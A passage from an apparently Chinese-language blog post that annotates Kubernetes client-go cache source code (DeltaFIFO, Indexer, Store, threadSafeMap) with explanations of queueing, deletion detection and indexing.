已经删除的对象后续跟添加、更新有可能，因为同名的对象又被添加了，删除也是有可能  // 删除有些复杂  if actionType == Sync \u0026amp;\u0026amp; f.willObjectBeDeletedLocked(id) { return nil } // 3 构造Delta{actionType, obj}，添加到newDeltas 的items[id]  // 同一个对象的多次操作，所以要追加到Deltas数组f.items[id]中  newDeltas := append(f.items[id], Delta{actionType, obj}) // 4 去重操作  // 合并操作，去掉冗余的delta  newDeltas = dedupDeltas(newDeltas) if f.deltaCompressor != nil { newDeltas = f.deltaCompressor.Compress(newDeltas) } // 5. 如果有newDeltas，则通知所有消费者，解除阻塞  // 判断对象是否已经存在  _, exists := f.items[id] // 合并后操作有可能变成没有Delta么？后面的代码分析来看应该不会，所以暂时不知道这个判断目的  if len(newDeltas) \u0026gt; 0 { // 如果对象没有存在过，那就放入队列中，如果存在说明已经在queue中了，也就没必要再添加了  // f.queue 只保存 obj的id，即key  if !exists { f.queue = append(f.queue, id) } // 更新Deltas数组，通知所有调用Pop()的消费者模块  f.items[id] = newDeltas f.cond.Broadcast() } else if exists { // The compression step removed all deltas, so  // we need to remove this from our map (extra items  // in the queue are ignored if they are not in the  // map).  // 直接把对象删除，这段代码不知道什么条件会进来，因为dedupDeltas()肯定有返回结果的  // 这个分支不是消费者模块处理的，直接在delta_fifo处理了  delete(f.items, id) } return nil } // List returns a list of all the items; it returns the object // from the most recent Delta. // You should treat the items returned inside the deltas as immutable. func (f *DeltaFIFO) List() []interface{} { f.lock.RLock() defer f.lock.RUnlock() return f.listLocked() } func (f *DeltaFIFO) listLocked() []interface{} { list := make([]interface{}, 0, len(f.items)) for _, item := range f.items { // Copy item\u0026#39;s slice so operations on this slice (delta  // compression) won\u0026#39;t interfere with the object we return.  item = copyDeltas(item) list = append(list, item.Newest().Object) } return list } // ListKeys returns a list of all the keys of the objects currently // in the FIFO. func (f *DeltaFIFO) ListKeys() []string { f.lock.RLock() defer f.lock.RUnlock() list := make([]string, 0, len(f.items)) for key := range f.items { list = append(list, key) } return list } // Get returns the complete list of deltas for the requested item, // or sets exists=false. // You should treat the items returned inside the deltas as immutable. //Get返回请求项的完整deltas列表，或不存在，则将集合exists=false。 //您应该将delta中返回的项视为不可变的。 // 获取对象接口，这个有意思哈，用对象获取对象？如果说用Service对象获取Pod对象是不是就能接受了？ // 因为他们的对象键是相同的 func (f *DeltaFIFO) Get(obj interface{}) (item interface{}, exists bool, err error) { key, err := f.KeyOf(obj) if err != nil { return nil, false, KeyError{obj, err} } return f.GetByKey(key) } // GetByKey returns the complete list of deltas for the requested item, // setting exists=false if that list is empty. // You should treat the items returned inside the deltas as immutable. // 通过对象键获取对象 func (f *DeltaFIFO) GetByKey(key string) (item interface{}, exists bool, err error) { f.lock.RLock() defer f.lock.RUnlock() d, exists := f.items[key] if exists { // Copy item\u0026#39;s slice so operations on this slice (delta  // compression) won\u0026#39;t interfere with the object we return.  d = copyDeltas(d) } return d, exists, nil } // Checks if the queue is closed // 判断是否关闭 func (f *DeltaFIFO) IsClosed() bool { f.closedLock.Lock() defer f.closedLock.Unlock() if f.closed { return true } return false } // Pop blocks until an item is added to the queue, and then returns it. If // multiple items are ready, they are returned in the order in which they were // added/updated. The item is removed from the queue (and the store) before it // is returned, so if you don\u0026#39;t successfully process it, you need to add it back // with AddIfNotPresent(). // process function is called under lock, so it is safe update data structures // in it that need to be in sync with the queue (e.g. knownKeys). The PopProcessFunc // may return an instance of ErrRequeue with a nested error to indicate the current // item should be requeued (equivalent to calling AddIfNotPresent under the lock). // // Pop returns a \u0026#39;Deltas\u0026#39;, which has a complete list of all the things // that happened to the object (deltas) while it was sitting in the queue. // 对queue中的资源对象数据进行process处理 func (f *DeltaFIFO) Pop(process PopProcessFunc) (interface{}, error) { // DeltaFIFO 处理，加锁  f.lock.Lock() defer f.lock.Unlock() for { // 队列中有数据么？  for len(f.queue) == 0 { // When the queue is empty, invocation of Pop() is blocked until new item is enqueued.  // When Close() is called, the f.closed is set and the condition is broadcasted.  // Which causes this loop to continue and return from the Pop().  // 看来是先判断的是否有数据，后判断是否关闭，这个和chan像  if f.IsClosed() { return nil, FIFOClosedError } // 没数据那就等待  // 阻塞处理，直到队列有数据添加，此时len(f.queue) \u0026gt; 0, 跳出该for{}，执行后续pop处理流程  f.cond.Wait() } // 取出第一个对象  // 取出id 即object的key  id := f.queue[0] // 数组缩小，相当于把数组中的第一个元素弹出去了  // 去掉一个pod的id，更新queue  f.queue = f.queue[1:] // 取出对象，因为queue中存的是对象键  // 根据id 检索item 即某object所有的事件Deltas  item, ok := f.items[id] // 同步对象计数减一，当减到0就说明外部已经全部同步完毕了  if f.initialPopulationCount \u0026gt; 0 { f.initialPopulationCount-- } // 对象不存在，这个是什么情况？貌似我们在合并对象的时候代码上有这个逻辑，估计永远不会执行  if !ok { // Item may have been deleted subsequently.  continue } // 把对象删除  // 删除要处理的item的Deltas  delete(f.items, id) // Pop()需要传入一个回调函数，用于处理对象  // 处理该id-object的所有事件Deltas  err := process(item) // 如果需要重新入队列，那就重新入队列  if e, ok := err.(ErrRequeue); ok { f.addIfNotPresent(id, item) err = e.Err } // Don\u0026#39;t need to copyDeltas here, because we\u0026#39;re transferring  // ownership to the caller.  return item, err } } // Replace will delete the contents of \u0026#39;f\u0026#39;, using instead the given map. // \u0026#39;f\u0026#39; takes ownership of the map, you should not reference the map again // after calling this function. f\u0026#39;s queue is reset, too; upon return, it // will contain the items in the map, in no particular order. func (f *DeltaFIFO) Replace(list []interface{}, resourceVersion string) error { f.lock.Lock() defer f.lock.Unlock() keys := make(sets.String, len(list)) // 遍历所有的输入目标  for _, item := range list { // 计算目标键  key, err := f.KeyOf(item) if err != nil { return KeyError{item, err} } // 记录处理过的目标键，采用set存储，是为了后续快速查找  keys.Insert(key) // 因为输入是目标全量，所以每个目标相当于重新同步了一次  // 每个obj进行同步  if err := f.queueActionLocked(Sync, item); err != nil { return fmt.Errorf(\u0026#34;couldn\u0026#39;t enqueue object: %v\u0026#34;, err) } } // 如果没有存储的话，自己存储的就是所有的老对象，目的要看看哪些老对象不在全量集合中，那么就是删除的对象了  if f.knownObjects == nil { // Do deletion detection against our own list.  // 遍历所有的元素  for k, oldItem := range f.items { // 这个目标在输入的对象中存在就可以忽略  // 因为输入对象keys是要更新替换（replace）到存储（indexer）中的obj  if keys.Has(k) { continue } // 输入对象中没有，说明对象已经被删除了  var deletedObj interface{} if n := oldItem.Newest(); n != nil { deletedObj = n.Object } // 终于看到哪里用到DeletedFinalStateUnknown了，队列中存储对象的Deltas数组中  // 可能已经存在Delete了，避免重复，采用DeletedFinalStateUnknown这种类型  // DeletedFinalStateUnknown 状态：是delat_fifo本地检查出该obj要删除，但是没有从list-watch到这个ojb的删除事件（可能丢失或延时）  if err := f.queueActionLocked(Deleted, DeletedFinalStateUnknown{k, deletedObj}); err != nil { return err } } // 如果populated还没有设置，说明是第一次并且还没有任何修改操作执行过  // 队列中第1次输入数据，设置标志符号和initialPopulationCount  if !f.populated { f.populated = true f.initialPopulationCount = len(list) } return nil } // Detect deletions not already in the queue.  // TODO(lavalamp): This may be racy-- we aren\u0026#39;t properly locked  // with knownObjects. Unproven.  // 下面处理的就是检测某些目标删除但是Delta没有在队列中  // 从存储中获取所有对象键  knownKeys := f.knownObjects.ListKeys() queuedDeletions := 0 for _, k := range knownKeys { // knownKeys存储的对象还在目标对象keys中，那就忽略  if keys.Has(k) { continue } // 获取待deletedObj对象  deletedObj, exists, err := f.knownObjects.GetByKey(k) if err != nil { deletedObj = nil glog.Errorf(\u0026#34;Unexpected error %v during lookup of key %v, placing DeleteFinalStateUnknown marker without object\u0026#34;, err, k) } else if !exists { deletedObj = nil glog.Infof(\u0026#34;Key %v does not exist in known objects store, placing DeleteFinalStateUnknown marker without object\u0026#34;, k) } // 累积删除的对象数量  queuedDeletions++ // 把对象删除的Delta放入队列  if err := f.queueActionLocked(Deleted, DeletedFinalStateUnknown{k, deletedObj}); err != nil { return err } } // 和上面的代码差不多，只是计算initialPopulationCount值的时候增加了删除对象的数量  if !f.populated { f.populated = true f.initialPopulationCount = len(list) + queuedDeletions } return nil } // Resync will send a sync event for each item // 重新同步，这个在cache实现是空的，这里面有具体实现 // 把knownObjects的objs同步更新到delta_fifo中 func (f *DeltaFIFO) Resync() error { f.lock.Lock() defer f.lock.Unlock() // 如果没有Indexer那么重新同步是没有意义的，因为连同步了哪些对象都不知道  // 列举Indexer里面所有的对象键  keys := f.knownObjects.ListKeys() // 遍历对象键，为每个对象产生一个同步的Delta  for _, k := range keys { // 具体对象同步实现接口  if err := f.syncKeyLocked(k); err != nil { return err } } return nil } func (f *DeltaFIFO) syncKey(key string) error { f.lock.Lock() defer f.lock.Unlock() return f.syncKeyLocked(key) } // 具体对象同步实现接口 func (f *DeltaFIFO) syncKeyLocked(key string) error { // 获取对象  obj, exists, err := f.knownObjects.GetByKey(key) if err != nil { glog.Errorf(\u0026#34;Unexpected error %v during lookup of key %v, unable to queue object for sync\u0026#34;, err, key) return nil } else if !exists { glog.Infof(\u0026#34;Key %v does not exist in known objects store, unable to queue object for sync\u0026#34;, key) return nil } // If we are doing Resync() and there is already an event queued for that object,  // we ignore the Resync for it. This is to avoid the race, in which the resync  // comes with the previous value of object (since queueing an event for the object  // doesn\u0026#39;t trigger changing the underlying store \u0026lt;knownObjects\u0026gt;.  // 计算对象的键值，有人会问对象键不是已经传入了么？那个是存在Indexer里面的对象键，可能与这里的计算方式不同  id, err := f.KeyOf(obj) if err != nil { return KeyError{obj, err} } // 对象已经在存在，说明后续会通知对象的新变化，所以再加更新也没意义  if len(f.items[id]) \u0026gt; 0 { return nil } // 添加对象同步的这个Delta  if err := f.queueActionLocked(Sync, obj); err != nil { return fmt.Errorf(\u0026#34;couldn\u0026#39;t queue object: %v\u0026#34;, err) } return nil } // A KeyListerGetter is anything that knows how to list its keys and look up by key. type KeyListerGetter interface { KeyLister KeyGetter } // A KeyLister is anything that knows how to list its keys. type KeyLister interface { ListKeys() []string } // A KeyGetter is anything that knows how to get the value stored under a given key. type KeyGetter interface { GetByKey(key string) (interface{}, bool, error) } // DeltaCompressor is an algorithm that removes redundant changes. type DeltaCompressor interface { Compress(Deltas) Deltas } // DeltaCompressorFunc should remove redundant changes; but changes that // are redundant depend on one\u0026#39;s desired semantics, so this is an // injectable function. // // DeltaCompressorFunc adapts a raw function to be a DeltaCompressor. type DeltaCompressorFunc func(Deltas) Deltas // Compress just calls dc. func (dc DeltaCompressorFunc) Compress(d Deltas) Deltas { return dc(d) } // DeltaType is the type of a change (addition, deletion, etc) type DeltaType string const ( Added DeltaType = \u0026#34;Added\u0026#34; Updated DeltaType = \u0026#34;Updated\u0026#34; Deleted DeltaType = \u0026#34;Deleted\u0026#34; // The other types are obvious. You\u0026#39;ll get Sync deltas when:  // * A watch expires/errors out and a new list/watch cycle is started.  // * You\u0026#39;ve turned on periodic syncs.  // (Anything that trigger\u0026#39;s DeltaFIFO\u0026#39;s Replace() method.)  Sync DeltaType = \u0026#34;Sync\u0026#34; ) // Delta is the type stored by a DeltaFIFO. It tells you what change // happened, and the object\u0026#39;s state after* that change. // // [*] Unless the change is a deletion, and then you\u0026#39;ll get the final // state of the object before it was deleted. type Delta struct { Type DeltaType Object interface{} } // Deltas is a list of one or more \u0026#39;Delta\u0026#39;s to an individual object. // The oldest delta is at index 0, the newest delta is the last one. type Deltas []Delta // Oldest is a convenience function that returns the oldest delta, or // nil if there are no deltas. func (d Deltas) Oldest() *Delta { if len(d) \u0026gt; 0 { return \u0026amp;d[0] } return nil } // Newest is a convenience function that returns the newest delta, or // nil if there are no deltas. func (d Deltas) Newest() *Delta { if n := len(d); n \u0026gt; 0 { return \u0026amp;d[n-1] } return nil } // copyDeltas returns a shallow copy of d; that is, it copies the slice but not // the objects in the slice. This allows Get/List to return an object that we // know won\u0026#39;t be clobbered by a subsequent call to a delta compressor. func copyDeltas(d Deltas) Deltas { d2 := make(Deltas, len(d)) copy(d2, d) return d2 } // DeletedFinalStateUnknown is placed into a DeltaFIFO in the case where // an object was deleted but the watch deletion event was missed. In this // case we don\u0026#39;t know the final \u0026#34;resting\u0026#34; state of the object, so there\u0026#39;s // a chance the included `Obj` is stale. type DeletedFinalStateUnknown struct { Key string Obj interface{} }   主要处理函数\n  queueActionLocked：生产者方法，relactor调用，主要处理obj的的入队和保存\n  pop：消费者方法，conroller通过DeltaFIFO的process回调函数HandleDeltas处理\n  从Replace()的实现来看，主要用于实现对象的全量更新。这个可以理解为DeltaFIFO在必要的时刻做一次全量更新，这个时刻可以是定期的，也可以是事件触发的。由于DeltaFIFO对外输出的就是所有目标的增量变化，所以每次全量更新都要判断对象是否已经删除，因为在全量更新前可能没有收到目标删除的请求。这一点与cache不同，cache的Replace()相当于重建，因为cache就是对象全量的一种内存映射，所以Replace()就等于重建。\n  那我来问题一个非常有水平的问题，为什么knownObjects为nil时需要对比队列和对象全量来判断对象是否删除，而knownObjects不为空的时候就不需要了？如果读者想判断自己是否已经全部理解可以不看下面自己想想。\n knownObjects就是Indexer(具体实现是cache)，而开篇的那副图已经非常明确的描述了二者以及使用之间的关系。也就是说knownObjects有的对象就是使用者知道的所有对象，此时即便队列(DeltaFIFO)中有相应的对象，在更新的全量对象中又被删除了，那就没必要通知使用者对象删除了，这种情况可以假想为系统短时间添加并删除了对象，对使用者来说等同于没有这个对象。    说明  判断是否已同步populated和initialPopulationCount这两个变量存在的目的是什么？我的理解是否已同步指的是第一次从apiserver获取全量对象是否已经全部通知到外部，也就是通过Pop()被取走。所谓的同步就是指apiserver的状态已经同步到缓存中了，也就是Indexer中； 接口AddIfNotPresent()存在的目的是什么，只有在Pop()函数中使用了一次，但是在调用这个接口的时候已经从map中删除了，所以肯定不存在。这个接口在我看来主要用来保险的，因为Pop()本身就存在重入队列的可能，外部如果判断返回错误重入队列就可能会重复； 最后，我们还是用一幅图来总结一下  Index index 就是带索引器的本地缓存\nindex tools/cache/index.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97  package cache import ( \u0026#34;fmt\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/api/meta\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/util/sets\u0026#34; ) // Indexer is a storage interface that lets you list objects using multiple indexing functions type Indexer interface { Store // Retrieve list of objects that match on the named indexing function  // indexName索引类，obj是对象，计算obj在indexName索引类中的索引键，通过索引键把所有的对象取出来  // 基本就是获取符合obj特征的所有对象，所谓的特征就是对象在索引类中的索引键  Index(indexName string, obj interface{}) ([]interface{}, error) // IndexKeys returns the set of keys that match on the named indexing function.  // indexKey是indexName索引类中一个索引键，函数返回indexKey指定的所有对象键  // 这个对象键是Indexer内唯一的，在添加的时候会计算  IndexKeys(indexName, indexKey string) ([]string, error) // ListIndexFuncValues returns the list of generated values of an Index func  // 获取indexName索引类中的所有索引键  ListIndexFuncValues(indexName string) []string // ByIndex lists object that match on the named indexing function with the exact key  // 这个函数和Index类似，只是返回值不是对象键，而是所有对象  ByIndex(indexName, indexKey string) ([]interface{}, error) // GetIndexer return the indexers  // 返回Indexers  GetIndexers() Indexers // AddIndexers adds more indexers to this store. If you call this after you already have data  // in the store, the results are undefined.  // 添加Indexers，就是增加更多的索引分类  AddIndexers(newIndexers Indexers) error } // IndexFunc knows how to provide an indexed value for an object. type IndexFunc func(obj interface{}) ([]string, error) // IndexFuncToKeyFuncAdapter adapts an indexFunc to a keyFunc. This is only useful if your index function returns // unique values for every object. This is conversion can create errors when more than one key is found. You // should prefer to make proper key and index functions. func IndexFuncToKeyFuncAdapter(indexFunc IndexFunc) KeyFunc { return func(obj interface{}) (string, error) { indexKeys, err := indexFunc(obj) if err != nil { return \u0026#34;\u0026#34;, err } if len(indexKeys) \u0026gt; 1 { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;too many keys: %v\u0026#34;, indexKeys) } if len(indexKeys) == 0 { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;unexpected empty indexKeys\u0026#34;) } return indexKeys[0], nil } } const ( NamespaceIndex string = \u0026#34;namespace\u0026#34; ) // MetaNamespaceIndexFunc is a default index function that indexes based on an object\u0026#39;s namespace func MetaNamespaceIndexFunc(obj interface{}) ([]string, error) { meta, err := meta.Accessor(obj) if err != nil { return []string{\u0026#34;\u0026#34;}, fmt.Errorf(\u0026#34;object has no meta: %v\u0026#34;, err) } return []string{meta.GetNamespace()}, nil } // Index maps the indexed value to a set of keys in the store that match on that value // sets.String 保存的是 本地缓存的key set， // 这个map的key 即为索引值keyvalue，比如usernmae1 // map[string]sets.String map[username1]{default/pod1, default/pod2} // Index 索引器，包含不同keyvalue的map type Index map[string]sets.String // sets.String is a set of strings, implemented via map[string]struct{} for minimal memory consumption. // sets.String 保存的是 本地缓存的key set，即cache items存储obj的key //type String map[string]Empty  // Indexers maps a name to a IndexFunc // 计算索引的函数有很多, 采用map，用名字分类 type Indexers map[string]IndexFunc // 计算索引的函数，传入对象，输出字符串索引，注意是数组哦！ //type IndexFunc func(obj interface{}) ([]string, error)  // Indices maps a name to an Index // 由于有多种计算索引的方式，那就又要按照计算索引的方式组织索引 // Indices的 key 即为 Indexers的key // Indices 索引器map，包含不同命名的索引器 type Indices map[string]Index    Indexer-\u0026gt;Store就是缓存接口 cache实现了store接口 数据对象缓存到了cache.cacheStorage ThreadSafeStore ThreadSafeStore 是线程安全的  所谓索引，索引目的就是为了快速查找。比如，我们需要查找某个节点上的所有Pod，那就要Pod按照节点名称排序，对应上面的Index类型就是map[nodename]sets.podname。我们可能有很多种查找方式，这就是Indexers这个类型作用了。  IndexFunc1\u0026hellip;..这些都是索引函数的名称，我们称之为索引类，大概意思就是把索引分类了； IndexKey1\u0026hellip;.这些是同一个对象在同一个索引类中的多个索引键值，我们称为索引键，切记索引键有多个； ObjKey1\u0026hellip;..这些是对象键，每个对象都有唯一的名称；  Indexers和Indices都是按照IndexFunc(名字)分组， 每个IndexFunc输出多个IndexKey，产生相同IndexKey的多个对象存储在一个集合中。\nstore tools/cache/store.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  package cache import ( \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/api/meta\u0026#34; ) // Store is a generic object storage interface. Reflector knows how to watch a server // and update a store. A generic store is provided, which allows Reflector to be used // as a local caching system, and an LRU store, which allows Reflector to work like a // queue of items yet to be processed. // // Store makes no assumptions about stored object identity; it is the responsibility // of a Store implementation to provide a mechanism to correctly key objects and to // define the contract for obtaining objects by some arbitrary key type. type Store interface { Add(obj interface{}) error Update(obj interface{}) error Delete(obj interface{}) error List() []interface{} // 列举对象键  ListKeys() []string // 返回obj相同对象键的对象，对象键是通过对象计算出来的字符串  Get(obj interface{}) (item interface{}, exists bool, err error) // 通过对象键获取对象  GetByKey(key string) (item interface{}, exists bool, err error) // Replace will delete the contents of the store, using instead the  // given list. Store takes ownership of the list, you should not reference  // it after calling this function.  // 用[]interface{}替换Store存储的所有对象，等同于删除全部原有对象在逐一添加新的对象  Replace([]interface{}, string) error // 重新同步  Resync() error } // KeyFunc knows how to make a key from an object. Implementations should be deterministic. type KeyFunc func(obj interface{}) (string, error) // cache responsibilities are limited to: // 1. Computing keys for objects via keyFunc // 2. Invoking methods of a ThreadSafeStorage interface type cache struct { // cacheStorage bears the burden of thread safety for the cache  cacheStorage ThreadSafeStore // keyFunc is used to make the key for objects stored in and retrieved from items, and  // should be deterministic.  keyFunc KeyFunc } var _ Store = \u0026amp;cache{}   thread_safe_store tools/cache/thread_safe_store.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341  /* Copyright 2014 The Kubernetes Authors. Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */ package cache import ( \u0026#34;fmt\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/util/sets\u0026#34; ) // ThreadSafeStore is an interface that allows concurrent access to a storage backend. // TL;DR caveats: you must not modify anything returned by Get or List as it will break // the indexing feature in addition to not being thread safe. // // The guarantees of thread safety provided by List/Get are only valid if the caller // treats returned items as read-only. For example, a pointer inserted in the store // through `Add` will be returned as is by `Get`. Multiple clients might invoke `Get` // on the same key and modify the pointer in a non-thread-safe way. Also note that // modifying objects stored by the indexers (if any) will *not* automatically lead // to a re-index. So it\u0026#39;s not a good idea to directly modify the objects returned by // Get/List, in general. type ThreadSafeStore interface { Add(key string, obj interface{}) Update(key string, obj interface{}) Delete(key string) Get(key string) (item interface{}, exists bool) List() []interface{} ListKeys() []string Replace(map[string]interface{}, string) Index(indexName string, obj interface{}) ([]interface{}, error) IndexKeys(indexName, indexKey string) ([]string, error) ListIndexFuncValues(name string) []string ByIndex(indexName, indexKey string) ([]interface{}, error) GetIndexers() Indexers // AddIndexers adds more indexers to this store. If you call this after you already have data  // in the store, the results are undefined.  AddIndexers(newIndexers Indexers) error Resync() error } // threadSafeMap implements ThreadSafeStore type threadSafeMap struct { lock sync.RWMutex // key为keyfunc计算得出，namespace/name  items map[string]interface{} // indexers maps a name to an IndexFunc  // 索引器函数，用于计算索引key，如按注解byuser，构建索引  indexers Indexers // indices maps a name to an Index  indices Indices } func (c *threadSafeMap) Add(key string, obj interface{}) { c.lock.Lock() defer c.lock.Unlock() oldObject := c.items[key] c.items[key] = obj c.updateIndices(oldObject, obj, key) } func (c *threadSafeMap) Update(key string, obj interface{}) { c.lock.Lock() defer c.lock.Unlock() oldObject := c.items[key] c.items[key] = obj c.updateIndices(oldObject, obj, key) } func (c *threadSafeMap) Delete(key string) { c.lock.Lock() defer c.lock.Unlock() if obj, exists := c.items[key]; exists { c.deleteFromIndices(obj, key) delete(c.items, key) } } func (c *threadSafeMap) Get(key string) (item interface{}, exists bool) { c.lock.RLock() defer c.lock.RUnlock() item, exists = c.items[key] return item, exists } func (c *threadSafeMap) List() []interface{} { c.lock.RLock() defer c.lock.RUnlock() list := make([]interface{}, 0, len(c.items)) for _, item := range c.items { list = append(list, item) } return list } // ListKeys returns a list of all the keys of the objects currently // in the threadSafeMap. func (c *threadSafeMap) ListKeys() []string { c.lock.RLock() defer c.lock.RUnlock() list := make([]string, 0, len(c.items)) for key := range c.items { list = append(list, key) } return list } func (c *threadSafeMap) Replace(items map[string]interface{}, resourceVersion string) { c.lock.Lock() defer c.lock.Unlock() c.items = items // rebuild any index  c.indices = Indices{} for key, item := range c.items { c.updateIndices(nil, item, key) } } // Index returns a list of items that match on the index function // Index is thread-safe so long as you treat all items as immutable // 这个函数就是通过指定的索引函数计算对象的索引键，然后把索引键的对象全部取出来 // 利用一个对象计算出来的索引键，然后把所有具备这些索引键的对象全部取出来， // 比如取出一个Pod所在节点上的所有Pod，这样理解就会非常方便，但是kubernetes可能就不这么用。 // 再比如取出满足某个标签或者注解的所有Pod // 如果更抽象一点，就是符合对象某些特征的所有对象，而这个特征就是我们指定的索引函数计算出来的 func (c *threadSafeMap) Index(indexName string, obj interface{}) ([]interface{}, error) { c.lock.RLock() defer c.lock.RUnlock() // 取出indexName这个分类索引函数  indexFunc := c.indexers[indexName] if indexFunc == nil { return nil, fmt.Errorf(\u0026#34;Index with name %s does not exist\u0026#34;, indexName) } // 计算对象的索引键  indexKeys, err := indexFunc(obj) if err != nil { return nil, err } // 取出indexName这个分类所有索引  index := c.indices[indexName] // need to de-dupe the return list. Since multiple keys are allowed, this can happen.  // 返回对象的对象键的集合  returnKeySet := sets.String{} // 遍历刚刚计算出来的所有索引键  for _, indexKey := range indexKeys { // 取出索引键的所有对象键，数组形式  set := index[indexKey] for _, key := range set.UnsortedList() { // 这里的每个key 代表一个obj的key，标识一个obj  // 把所有的对象键输出到对象键的集合中  returnKeySet.Insert(key) } } // 通过对象键逐一的把对象取出  // 根据obj key，从items取出obj，放入list中  list := make([]interface{}, 0, returnKeySet.Len()) for absoluteKey := range returnKeySet { list = append(list, c.items[absoluteKey]) } return list, nil } // ByIndex returns a list of items that match an exact value on the index function // 这个函数和上面的函数基本一样，只是索引键不用再计算了，使用者提供 func (c *threadSafeMap) ByIndex(indexName, indexKey string) ([]interface{}, error) { c.lock.RLock() defer c.lock.RUnlock() indexFunc := c.indexers[indexName] if indexFunc == nil { return nil, fmt.Errorf(\u0026#34;Index with name %s does not exist\u0026#34;, indexName) } index := c.indices[indexName] // 根据indexkey索引key，找到object items的key，然后再从c.items中取出  set := index[indexKey] list := make([]interface{}, 0, set.Len()) for _, key := range set.List() { list = append(list, c.items[key]) } return list, nil } // IndexKeys returns a list of keys that match on the index function. // IndexKeys is thread-safe so long as you treat all items as immutable. func (c *threadSafeMap) IndexKeys(indexName, indexKey string) ([]string, error) { c.lock.RLock() defer c.lock.RUnlock() indexFunc := c.indexers[indexName] if indexFunc == nil { return nil, fmt.Errorf(\u0026#34;Index with name %s does not exist\u0026#34;, indexName) } index := c.indices[indexName] set := index[indexKey] return set.List(), nil } // 这个函数用来获取索引分类内的所有索引键的 func (c *threadSafeMap) ListIndexFuncValues(indexName string) []string { c.lock.RLock() defer c.lock.RUnlock() // 获取索引分类的所有索引  index := c.indices[indexName] names := make([]string, 0, len(index)) // 直接遍历后输出索引键  for key := range index { names = append(names, key) } return names } func (c *threadSafeMap) GetIndexers() Indexers { return c.indexers } func (c *threadSafeMap) AddIndexers(newIndexers Indexers) error { c.lock.Lock() defer c.lock.Unlock() if len(c.items) \u0026gt; 0 { return fmt.Errorf(\u0026#34;cannot add indexers to running index\u0026#34;) } oldKeys := sets.StringKeySet(c.indexers) newKeys := sets.StringKeySet(newIndexers) if oldKeys.HasAny(newKeys.List()...) { return fmt.Errorf(\u0026#34;indexer conflict: %v\u0026#34;, oldKeys.Intersection(newKeys)) } for k, v := range newIndexers { c.indexers[k] = v } return nil } // updateIndices modifies the objects location in the managed indexes, if this is an update, you must provide an oldObj // updateIndices must be called from a function that already has a lock on the cache // 当有对象添加或者更新时，需要更新索引，因为调用该函数的函数已经加锁了，所以这个函数没有加锁操作 func (c *threadSafeMap) updateIndices(oldObj interface{}, newObj interface{}, key string) error { // 在添加和更新的时候都会获取老对象，如果存在老对象，那么就要删除老对象的索引  // key 就是本地缓存caech item的object的key  // 如果已有old object 则删除，后面进行更新  // if we got an old object, we need to remove it before we add it again  if oldObj != nil { c.deleteFromIndices(oldObj, key) } // 遍历所有的索引函数，因为要为对象在所有的索引分类中创建索引键  // 索引器函数indexFunc， 如name为byuser，fnc为 UserIndexFunc  for name, indexFunc := range c.indexers { // 计算索引键  // 根据索引器 检索出的索引值，比如根据pod object 的user注解，检索出username 列表  indexValues, err := indexFunc(newObj) if err != nil { return err } // 获取索引分类的所有索引  index := c.indices[name] // 为空说明这个索引分类还没有任何索引  if index == nil { index = Index{} // 按name 构建索引器，比如按user注解构建的name=byuser 的索引器  c.indices[name] = index } // 遍历对象的索引键，上面刚刚用索引函数计算出来的，如注解users的各个值，即indexvalue  for _, indexValue := range indexValues { // 找到索引键的对象集合  set := index[indexValue] // 为空说明这个索引键下还没有对象  if set == nil { // 创建对象键集合  set = sets.String{} index[indexValue] = set } // 把这个obj的对象键添加到集合中，即这个obj的name类型索引已创建完成  set.Insert(key) } } return nil } // deleteFromIndices removes the object from each of the managed indexes // it is intended to be called from a function that already has a lock on the cache func (c *threadSafeMap) deleteFromIndices(obj interface{}, key string) error { // 遍历索引函数，也就是把所有索引分类  for name, indexFunc := range c.indexers { indexValues, err := indexFunc(obj) if err != nil { return err } // 获取索引分类的所有索引  index := c.indices[name] if index == nil { continue } // 遍历对象的索引键  for _, indexValue := range indexValues { //把对象从索引键指定对对象集合删除  set := index[indexValue] if set != nil { set.Delete(key) } } } return nil } func (c 